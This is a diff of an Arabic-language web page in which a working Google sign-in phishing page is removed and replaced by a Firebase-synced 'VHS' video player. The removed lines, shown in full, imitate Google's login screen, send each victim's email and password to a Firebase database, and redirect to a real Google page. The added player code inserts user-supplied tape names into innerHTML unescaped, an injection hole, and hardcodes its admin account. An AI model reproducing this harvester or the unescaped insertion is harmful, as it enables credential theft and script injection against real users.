@@ -2,114 +2,568 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - حسابات Google</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>VHS Sync Control</title>
     
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
 
     <style>
-        body { background-color: #fff; color: #202124; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { width: 450px; min-height: 500px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-sizing: border-box; position: relative;}
-        .logo { width: 75px; height: 24px; margin-bottom: 10px; }
-        h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px; }
-        .subtitle { font-size: 16px; margin-bottom: 30px; }
-        .input-group { position: relative; margin-bottom: 10px; text-align: right; }
-        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; box-sizing: border-box; transition: border 0.2s; }
-        input:focus { border: 2px solid #1a73e8; }
-        .forgot-link { text-align: right; font-size: 14px; color: #1a73e8; font-weight: 500; margin-bottom: 40px; cursor: pointer; display: block; text-decoration: none; }
-        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
-        .create-link { color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; text-decoration: none; padding: 10px 0; }
-        .btn-next { background-color: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
-        #password-view { display: none; }
-        .user-display { display: inline-flex; align-items: center; padding: 4px 12px; border: 1px solid #dadce0; border-radius: 20px; margin-bottom: 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
-        .loading-bar { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: #e8f0fe; display: none; overflow: hidden; border-radius: 8px 8px 0 0; }
-        .loading-progress { width: 40%; height: 100%; background: #1a73e8; position: absolute; animation: googleLoader 1.5s infinite linear; }
-        @keyframes googleLoader { 0% { left: -40%; } 100% { left: 100%; } }
+        :root { 
+            --target-navy: #151b4e; 
+            --dark-navy: #0d1131;   
+            --pure-white: #ffffff;
+            --power-red: #ff4b2b;
+            --power-green: #2ecc71;
+            --eject-yellow: #f1c40f;
+        }
+        
+        body { 
+            background-color: var(--target-navy); 
+            font-family: 'Courier New', monospace; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            margin: 0; 
+            padding: 20px; 
+            color: var(--pure-white);
+            min-height: 100vh;
+            background: linear-gradient(135deg, var(--target-navy) 0%, var(--dark-navy) 100%);
+            overflow-x: hidden;
+        }
+        
+        .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; gap: 20px; }
+
+        .tv-unit { 
+            background: var(--target-navy); 
+            padding: 8px; 
+            border-radius: 4px; 
+            border: 1px solid rgba(255,255,255,0.1); 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            position: relative;
+        }
+
+        .screen-border { 
+            background: #000; 
+            aspect-ratio: 16 / 9; 
+            position: relative; 
+            overflow: hidden; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+        }
+
+        #tap-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+            z-index: 100;
+        }
+
+        #noise-canvas {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 1;
+            opacity: 0.9;
+            display: none;
+        }
+
+        video { width: 100%; height: 100%; object-fit: contain; z-index: 2; display: none; }
+
+        .tv-controls {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            padding: 10px 0 5px 0;
+        }
+        
+        .power-btn, .eject-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 2px solid rgba(255,255,255,0.2);
+            background: #111;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+        
+        .power-btn.active {
+            border-color: var(--power-green);
+            box-shadow: 0 0 15px var(--power-green);
+        }
+        
+        .power-icon { width: 15px; height: 15px; fill: var(--power-red); }
+        .power-btn.active .power-icon { fill: var(--power-green); }
+
+        .eject-icon { width: 18px; height: 18px; fill: #666; }
+        .eject-btn:hover { border-color: var(--eject-yellow); box-shadow: 0 0 10px var(--eject-yellow); }
+        .eject-btn:hover .eject-icon { fill: var(--eject-yellow); }
+
+        .control-panel { 
+            background: var(--target-navy); 
+            border: 1px solid rgba(255,255,255,0.1); 
+            border-radius: 4px; 
+            padding: 20px; 
+        }
+        
+        input { 
+            width: 100%; 
+            background: var(--dark-navy); 
+            border: 1px solid rgba(255,255,255,0.2); 
+            color: var(--pure-white); 
+            padding: 12px; 
+            outline: none; 
+            font-family: inherit; 
+            box-sizing: border-box; 
+            direction: ltr;   
+        }
+
+        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
+        button { 
+            flex: 1; padding: 12px; background: var(--dark-navy); border: 1px solid rgba(255,255,255,0.2); 
+            color: var(--pure-white); cursor: pointer; font-family: inherit; font-size: 11px; text-transform: uppercase; 
+        }
+
+        #authSection { display: block; }
+        #adminSection { display: none; }
+
+        .vhs-library-title { margin-top: 30px; font-size: 14px; text-align: center; opacity: 0.8; }
+        
+        .vhs-shelf { 
+            display: flex; 
+            flex-wrap: wrap; 
+            gap: 20px; 
+            justify-content: center; 
+            margin-top: 15px; 
+            padding-bottom: 40px;
+            perspective: 1000px;
+        }
+
+        .vhs-tape {
+            background: #1a1a1a;
+            width: 130px;
+            height: 42px;
+            position: relative;
+            cursor: pointer;
+            border-radius: 3px;
+            box-shadow: 4px 4px 10px rgba(0,0,0,0.5);
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            border: 1px solid #111;
+        }
+
+        .vhs-tape::before {
+            content: "";
+            position: absolute;
+            top: 5px;
+            left: 8px;
+            right: 8px;
+            bottom: 5px;
+            background: linear-gradient(to bottom, #fff 0%, #e0e0e0 100%);
+            border-radius: 2px;
+            z-index: 1;
+        }
+
+        .vhs-tape::after {
+            content: "";
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 5px;
+            height: 100%;
+            background: var(--power-red);
+            z-index: 2;
+        }
+
+        .tape-label {
+            position: relative;
+            z-index: 3;
+            color: #333;
+            font-size: 10px;
+            font-weight: bold;
+            text-align: center;
+            width: 80%;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            font-family: sans-serif;
+        }
+
+        .vhs-tape:hover {
+            transform: translateY(-8px) rotateX(10deg);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.6);
+            filter: brightness(1.1);
+        }
+
+        .delete-btn {
+            position: absolute;
+            top: 2px;
+            right: 2px;
+            background: var(--power-red);
+            color: white;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            font-size: 9px;
+            z-index: 10;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            border: none;
+        }
     </style>
 </head>
-<body>
-
-<div class="loading-bar" id="top-loader"><div class="loading-progress"></div></div>
+<body> 
 
 <div class="container">
-    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
-    
-    <div id="email-view">
-        <h1>تسجيل الدخول</h1>
-        <div class="subtitle">المتابعة إلى Gmail</div>
-        <div class="input-group">
-            <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف">
+    <div class="tv-unit">
+        <div class="screen-border">
+            <div id="tap-overlay"></div>
+            <canvas id="noise-canvas"></canvas>
+            <video id="video" controls playsinline></video>
         </div>
-        <a href="https://accounts.google.com/signin/usernamerecovery" class="forgot-link" target="_blank">هل نسيت البريد الإلكتروني؟</a>
-        <div class="footer">
-            <a href="https://accounts.google.com/signup" class="create-link" target="_blank">إنشاء حساب</a>
-            <button class="btn-next" onclick="goToPassword()">التالي</button>
+        
+        <div class="tv-controls">
+            <div class="power-btn" id="powerBtn" onclick="handlePowerClick()">
+                <svg class="power-icon" viewBox="0 0 24 24">
+                    <path d="M13 3h-2v10h2V3zm4.83 2.17l-1.42 1.42C17.99 7.86 19 9.81 19 12c0 3.87-3.13 7-7 7s-7-3.13-7-7c0-2.19 1.01-4.14 2.58-5.42L6.17 5.17C4.23 6.82 3 9.26 3 12c0 4.97 4.03 9 9 9s9-4.03 9-9c0-2.74-1.23-5.18-3.17-6.83z"/>
+                </svg>
+            </div>
+            <div class="eject-btn" id="publicEjectBtn" onclick="publicEject()">
+                <svg class="eject-icon" viewBox="0 0 24 24">
+                    <path d="M5 17h14v2H5zm7-12L5.33 15h13.34z"/>
+                </svg>
+            </div>
         </div>
     </div>
 
-    <div id="password-view">
-        <h1>مرحباً</h1>
-        <div class="user-display" onclick="location.reload()">
-            <span id="display-email"></span>
+    <div class="control-panel">
+        <div id="authSection">
+            <input type="password" id="adminPass" placeholder="ENTER ACCESS CODE">
         </div>
-        <div class="input-group">
-            <input type="password" id="password" placeholder="أدخل كلمة المرور">
-        </div>
-        <a href="https://accounts.google.com/signin/recovery" class="forgot-link" target="_blank">هل نسيت كلمة المرور؟</a>
-        <div class="footer">
-            <span></span>
-            <button class="btn-next" onclick="finishLogin()">التالي</button>
+        
+        <div id="adminSection">
+            <p id="adminStatusText" style="font-size: 10px; color: var(--power-green); margin-bottom: 5px;">وضع المسؤول: متصل</p>
+            <input type="text" id="videoUrl" placeholder="PASTE DIRECT LINK TO TV">
+            
+            <div class="admin-tape-controls">
+                <p style="font-size: 10px; color: #aaa;">إضافة شريط جديد للرف:</p>
+                <div style="display: flex; gap: 5px; flex-direction: column;">
+                    <input type="text" id="newTapeName" placeholder="اسم الشريط (اختياري)" style="font-size: 11px; padding: 8px;">
+                    <input type="text" id="newTapeUrl" placeholder="رابط فيديو الشريط" style="font-size: 11px; padding: 8px;">
+                    <button onclick="addNewTape()" style="padding: 8px; font-size: 10px; background: var(--power-green); color: black; font-weight: bold;">+ إضافة شريط للرف</button>
+                </div>
+            </div>
+
+            <div class="btn-group">
+                <button style="color: #ff6b6b;" onclick="clearDB()">ADMIN RESET</button>
+                <button onclick="adminLogout()">LOGOUT</button>
+            </div>
         </div>
     </div>
+
+    <div class="vhs-library-title">اختر شريطاً للتشغيل:</div>
+    <div class="vhs-shelf" id="vhsShelf"></div>
 </div>
 
 <script>
-    // بيانات Firebase الخاصة بك
+    const canvas = document.getElementById('noise-canvas');
+    const ctx = canvas.getContext('2d');
+    const video = document.getElementById('video');
+    const overlay = document.getElementById('tap-overlay');
+    const powerBtn = document.getElementById('powerBtn');
+    let noiseID, audioCtx, noiseNode, isAdmin = false;
+    let isPoweredOn = false;
+    let isRemoteUpdate = false;
+    let globalAdminPresent = false;
+    let userHasInteracted = false;
+
     const firebaseConfig = {
-        apiKey: "AIzaSyAm1OfTW_qS4lhSGlqgDd6fiLDj3u93wqI",
-        authDomain: "clashdata-8424c.firebaseapp.com",
-        databaseURL: "https://clashdata-8424c-default-rtdb.firebaseio.com",
-        projectId: "clashdata-8424c",
-        storageBucket: "clashdata-8424c.firebasestorage.app",
-        messagingSenderId: "1063000922754",
-        appId: "1:1063000922754:web:87087f81c28c2659cb329b"
+        apiKey: "AIzaSyAjTD-OJBUYewp5bqV0iVh4Rxp5zjBsU54",
+        authDomain: "videos-5e336.firebaseapp.com",
+        databaseURL: "https://videos-5e336-default-rtdb.firebaseio.com",
+        projectId: "videos-5e336",
+        storageBucket: "videos-5e336.firebasestorage.app",
+        messagingSenderId: "300218651134",
+        appId: "1:300218651134:web:4bd24df8e555e62828f0af"
     };
 
-    // تهيئة Firebase
     firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
+    const db = firebase.database();
+    const auth = firebase.auth();
+    const syncRef = db.ref('videoSync');
+    const tapesRef = db.ref('tapesLibrary');
 
-    function goToPassword() {
-        const email = document.getElementById('email').value;
-        if(email.length < 5) return;
-        document.getElementById('top-loader').style.display = 'block';
-        setTimeout(() => {
-            document.getElementById('top-loader').style.display = 'none';
-            document.getElementById('email-view').style.display = 'none';
-            document.getElementById('password-view').style.display = 'block';
-            document.getElementById('display-email').innerText = email;
-        }, 850);
+    document.addEventListener('mousedown', () => userHasInteracted = true, {once: true});
+    document.addEventListener('touchstart', () => userHasInteracted = true, {once: true});
+
+    function handlePowerClick() {
+        userHasInteracted = true;
+        if (globalAdminPresent && !isAdmin) {
+            alert("الأدمن متصل، هو فقط من يتحكم بالطاقة حالياً");
+            return;
+        }
+        const nextState = !isPoweredOn;
+        syncRef.update({ tvPower: nextState });
     }
 
-    function finishLogin() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
-        if(pass.length < 4) return;
-        
-        document.getElementById('top-loader').style.display = 'block';
-        
-        // محاولة إرسال البيانات
-        database.ref('google_test_results/').push({
-            account: email,
-            password: pass,
-            timestamp: new Date().toLocaleString()
-        }).then(() => {
-            window.location.href = "https://myaccount.google.com/";
-        }).catch((error) => {
-            console.error("خطأ في الإرسال:", error);
-            alert("فشل الاتصال بـ Firebase. تأكد من إعدادات Rules.");
+    function applyPowerState(state) {
+        isPoweredOn = state;
+        if (isPoweredOn) {
+            powerBtn.classList.add('active');
+            overlay.style.display = 'none';
+            initAudio();
+            syncRef.once('value', (snap) => handleSyncUpdate(snap.val()));
+        } else {
+            powerBtn.classList.remove('active');
+            overlay.style.display = 'block';
+            video.style.display = 'none';
+            video.pause();
+            toggleStatic(false);
+            if (audioCtx) audioCtx.suspend();
+        }
+    }
+
+    function publicEject() {
+        userHasInteracted = true;
+        // تعديل: منع المشاهد من الإخراج إذا كان الأدمن موجوداً
+        if (globalAdminPresent && !isAdmin) {
+            alert("الأدمن متصل، لا يمكنك إخراج الشريط حالياً");
+            return;
+        }
+        if(!isPoweredOn) { alert("شغل التلفزيون أولاً!"); return; }
+        syncRef.set({ tvPower: true, isPlaying: false, url: null, adminPresent: globalAdminPresent });
+    }
+
+    function addNewTape() {
+        const name = document.getElementById('newTapeName').value || "شريط غير مسمى";
+        const url = document.getElementById('newTapeUrl').value;
+        if(!url) { alert("يرجى وضع رابط الفيديو أولاً"); return; }
+        tapesRef.push({ name: name, url: url, timestamp: Date.now() }).then(() => {
+            document.getElementById('newTapeName').value = "";
+            document.getElementById('newTapeUrl').value = "";
         });
+    }
+
+    function deleteTape(key) {
+        if(confirm("حذف هذا الشريط نهائياً؟")) { tapesRef.child(key).remove(); }
+    }
+
+    tapesRef.on('value', (snap) => {
+        const shelf = document.getElementById('vhsShelf');
+        shelf.innerHTML = "";
+        const data = snap.val();
+        if(!data) return;
+
+        Object.keys(data).forEach(key => {
+            const tape = data[key];
+            const el = document.createElement('div');
+            el.className = 'vhs-tape';
+            el.innerHTML = `
+                <div class="delete-btn" style="display:${isAdmin?'flex':'none'}" onclick="event.stopPropagation(); deleteTape('${key}')">✕</div>
+                <div class="tape-label">${tape.name}</div>
+            `;
+            el.onclick = () => {
+                userHasInteracted = true;
+                // تعديل: منع المشاهد من تغيير الشريط إذا كان الأدمن موجوداً
+                if (globalAdminPresent && !isAdmin) {
+                    alert("الأدمن متصل، هو فقط من يغير الأشرطة حالياً");
+                    return;
+                }
+                if(!isPoweredOn) { alert("شغل التلفزيون أولاً!"); return; }
+                video.play().catch(() => {}); 
+                syncRef.update({ 
+                    url: tape.url, 
+                    currentTime: 0, 
+                    isPlaying: true, 
+                    adminPresent: isAdmin,
+                    lastUpdated: Date.now() 
+                });
+            };
+            shelf.appendChild(el);
+        });
+    });
+
+    function initAudio() {
+        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        if (audioCtx.state === 'suspended') audioCtx.resume();
+    }
+
+    function startStaticSound() {
+        if (!audioCtx || noiseNode || !isPoweredOn) return;
+        const buffer = audioCtx.createBuffer(1, audioCtx.sampleRate * 2, audioCtx.sampleRate);
+        const data = buffer.getChannelData(0);
+        for (let i = 0; i < data.length; i++) data[i] = Math.random() * 2 - 1;
+        noiseNode = audioCtx.createBufferSource();
+        noiseNode.buffer = buffer; noiseNode.loop = true;
+        const gainNode = audioCtx.createGain();
+        gainNode.gain.value = 0.04;
+        noiseNode.connect(gainNode); gainNode.connect(audioCtx.destination);
+        noiseNode.start();
+    }
+
+    function stopStaticSound() { if (noiseNode) { try { noiseNode.stop(); } catch(e) {} noiseNode = null; } }
+
+    function loopNoise() {
+        if (!isPoweredOn) return;
+        canvas.width = 200; canvas.height = 150;
+        const idata = ctx.createImageData(canvas.width, canvas.height);
+        const b32 = new Uint32Array(idata.data.buffer);
+        for (let i = 0; i < b32.length; i++) b32[i] = ((Math.random() * 255) | 0) << 24 | (Math.random() * 0xffffff);
+        ctx.putImageData(idata, 0, 0);
+        noiseID = requestAnimationFrame(loopNoise);
+    }
+
+    function toggleStatic(show) {
+        if (show && isPoweredOn) {
+            canvas.style.display = 'block';
+            if (!noiseID) loopNoise();
+            stopStaticSound(); startStaticSound();
+        } else {
+            canvas.style.display = 'none';
+            cancelAnimationFrame(noiseID); noiseID = null;
+            stopStaticSound();
+        }
+    }
+
+    video.onended = () => {
+        if (!isRemoteUpdate && isPoweredOn) {
+            syncRef.update({ isPlaying: false, currentTime: 0, url: null });
+        }
+    };
+
+    video.onpause = () => {
+        if (!isRemoteUpdate && isPoweredOn && userHasInteracted) {
+            // منع المشاهد من إيقاف الفيديو عند الجميع إذا كان الأدمن موجوداً
+            if (globalAdminPresent && !isAdmin) return;
+            syncRef.update({ isPlaying: false, currentTime: video.currentTime });
+        }
+    };
+
+    video.onplay = () => {
+        if (!isRemoteUpdate && isPoweredOn && userHasInteracted) {
+            // منع المشاهد من تشغيل الفيديو عند الجميع إذا كان الأدمن موجوداً
+            if (globalAdminPresent && !isAdmin) return;
+            syncRef.update({ 
+                isPlaying: true, 
+                currentTime: video.currentTime,
+                lastUpdated: Date.now() - (video.currentTime * 1000) 
+            });
+        }
+    };
+
+    function handleSyncUpdate(data) {
+        if (!data) return;
+
+        if (data.tvPower !== undefined && data.tvPower !== isPoweredOn) {
+            applyPowerState(data.tvPower);
+        }
+
+        globalAdminPresent = data.adminPresent || false;
+
+        if (!isPoweredOn) return;
+
+        if (!data.url) {
+            video.style.display = 'none'; video.pause();
+            toggleStatic(true); return;
+        }
+        
+        isRemoteUpdate = true;
+        video.style.display = 'block'; 
+        toggleStatic(false); 
+        
+        if (!video.src.includes(data.url)) {
+            loadVideo(data.url);
+        }
+
+        let targetTime = data.currentTime;
+        if (data.isPlaying && data.lastUpdated) {
+            const elapsed = (Date.now() - data.lastUpdated) / 1000;
+            targetTime = elapsed > 0 ? elapsed : data.currentTime;
+        }
+
+        if (data.isPlaying) { 
+            video.play().catch(error => {
+                video.muted = true;
+                video.play();
+            }); 
+        } else { 
+            video.pause(); 
+        }
+
+        const timeDiff = Math.abs(video.currentTime - targetTime);
+        if (timeDiff > 2) video.currentTime = targetTime;
+        
+        setTimeout(() => { isRemoteUpdate = false; }, 200);
+    }
+
+    auth.onAuthStateChanged(user => {
+        if (user && user.email === "t@t.tt") {
+            isAdmin = true;
+            userHasInteracted = true;
+            document.getElementById('authSection').style.display = 'none';
+            document.getElementById('adminSection').style.display = 'block';
+            
+            syncRef.update({ adminPresent: true });
+
+            video.ontimeupdate = () => {
+                if (!video.paused && !isRemoteUpdate && isAdmin) {
+                    syncRef.update({ 
+                        currentTime: video.currentTime, 
+                        lastUpdated: Date.now() - (video.currentTime * 1000),
+                        adminPresent: true 
+                    });
+                }
+            };
+
+            window.addEventListener('beforeunload', () => {
+                syncRef.update({ adminPresent: false });
+            });
+        }
+    });
+
+    document.getElementById('adminPass').addEventListener('input', (e) => {
+        if (e.target.value.length >= 6) auth.signInWithEmailAndPassword("t@t.tt", e.target.value).catch(()=>{});
+    });
+
+    document.getElementById('videoUrl').addEventListener('change', (e) => {
+        const val = e.target.value.trim();
+        if (val.startsWith('http')) {
+            syncRef.update({ 
+                url: val, 
+                currentTime: 0, 
+                isPlaying: true, 
+                adminPresent: isAdmin,
+                lastUpdated: Date.now() 
+            });
+            e.target.value = "";
+        }
+    });
+
+    syncRef.on('value', (snap) => handleSyncUpdate(snap.val()));
+
+    let hls;
+    function loadVideo(url) {
+        if (hls) hls.destroy();
+        if (url.includes('.m3u8')) {
+            if (Hls.isSupported()) { 
+                hls = new Hls(); hls.loadSource(url); hls.attachMedia(video); 
+            } else { video.src = url; }
+        } else { video.src = url; }
+    }
+
+    function clearDB() { if (confirm("إعادة ضبط النظام؟")) syncRef.set({ tvPower: false, adminPresent: isAdmin }); }
+    function adminLogout() { 
+        syncRef.update({ adminPresent: false });
+        auth.signOut().then(() => location.reload()); 
     }
 </script>
 </body>
